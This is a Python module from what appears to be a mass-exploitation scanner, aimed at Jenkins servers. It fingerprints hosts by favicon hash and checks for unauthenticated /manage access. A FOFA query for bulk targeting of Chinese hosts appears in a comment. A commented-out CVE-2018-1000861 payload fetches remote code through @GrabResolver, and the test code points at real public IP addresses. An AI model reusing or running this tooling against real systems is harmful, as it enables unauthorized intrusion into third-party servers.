# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-08-27 0:49
import hashlib
from urllib.parse import urlparse

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# fofa: app="docker-产品"
# python batch.py -m exploit.web.Unauth.Jenkins.Unauth -cs -fs "app=\"Jenkins\" && country=\"CN\""

class Script(BaseScript):
    name = 'Jenkins'

    def __init__(self, target, pbar):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.UNAUTH and BugType.RCE
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ['https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/']
        # 特定路径判断
        self.detectPathList = [':8080/favicon.ico', '/favicon.ico']
        # exec
        self.execPathList = ['/manage']
        self.pathList = {
            'detectPath': ['/favicon.ico'],
            'execPath': {
                'Unauth': '/manage',
                # 'CVE-2018-1000861': 'securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27"{}"%27,%20version=%271%27)%0aimport%20Payload;'
            }
        }

        # 进度条
        self.pbar = pbar
        # 相关信息
        self.info = ''
        self.favicon = ['23e8c7bd78e8cd826c5a6073b15068b1']

    async def detect(self):
        try:
            async with aiohttp.ClientSession() as session:
                urlLen = len(f'http://{self.target}'.split(':'))
                if urlLen == 2:
                    url = f'http://{self.target}{self.detectPathList[0]}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{self.detectPathList[0]}'
                elif urlLen == 3:
                    url = f'http://{self.target}{self.detectPathList[1]}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{self.detectPathList[1]}'
                for detectPath in self.pathList.get('detectPath'):
                    url = f'http://{self.target}{detectPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                    async with session.get(url=url, timeout=10, verify_ssl=False) as response:
                        if response is not None:
                            text = await response.read()
                            await asyncio.sleep(2)
                            m1 = hashlib.md5()
                            m1.update(text)
                            theMD5 = m1.hexdigest()
                            for _ in self.favicon:
                                if _ == theMD5:
                                    self.flag = True
                                    self.target = urlparse(url).netloc
                                    tqdm.write(Fore.RED + '[{}] {}'.format('Jenkins Finger', url))
                                    self.vulList.append({'name': 'Jenkins Finger', 'url': url, 'software': 'Jenkins'})
        except Exception:
            return None

    async def exec(self):
        try:
            async with aiohttp.ClientSession() as session:
                # Unauth
                url = f'http://{self.target}{self.pathList.get("execPath").get("Unauth")}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{self.pathList.get("execPath").get("Unauth")}'
                async with session.get(url=url, timeout=10, verify_ssl=False, allow_redirects=False) as response:
                    if response is not None and response.status == 200:
                        text = await response.text()
                        await asyncio.sleep(2)
                        if 'Manage Jenkins [Jenkins]' in text or \
                                '管理Jenkins [Jenkins]' in text:
                            self.flag = True
                            tqdm.write(Fore.RED + '[{}] {}'.format('Jenkins Unauth', url))
                            self.vulList.append({'name': 'Jenkins Unauth', 'url': url, 'software': 'Jenkins'})

                # CVE_2018_1000601
                # randomStr = str(random.randint(100000, 999999))
                # url = f'http://{self.target}{self.pathList.get("execPath").get("CVE-2018-1000861").format(randomStr)}' if self.target.startswith(
                #     ('http:', 'https:')) is False else f'{self.target}{self.pathList.get("execPath").get("CVE-2018-1000861").format(randomStr)}'
                # print(url)
                # async with session.get(url=url, timeout=10, verify_ssl=False, allow_redirects=False) as response1:
                #     if response1 is not None:
                #         text = await response.text()
                #         await asyncio.sleep(2)
                #         if randomStr in text:
                #             self.flag = True
                #             tqdm.write(Fore.RED + '[{}] {}'.format('Jenkins CVE_2018_1000601', url))
                #             self.vulList.append({'name': 'Jenkins CVE_2018_1000601', 'url': url, 'software': 'Jenkins'})
        except Exception:
            return None

    async def attack(self, semaphore):
        async with semaphore:
            await self.detect()
            await self.exec()
        self.pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib
    #
    resp = requests.get('https://149.154.99.149/_layouts/15/images/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)

    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
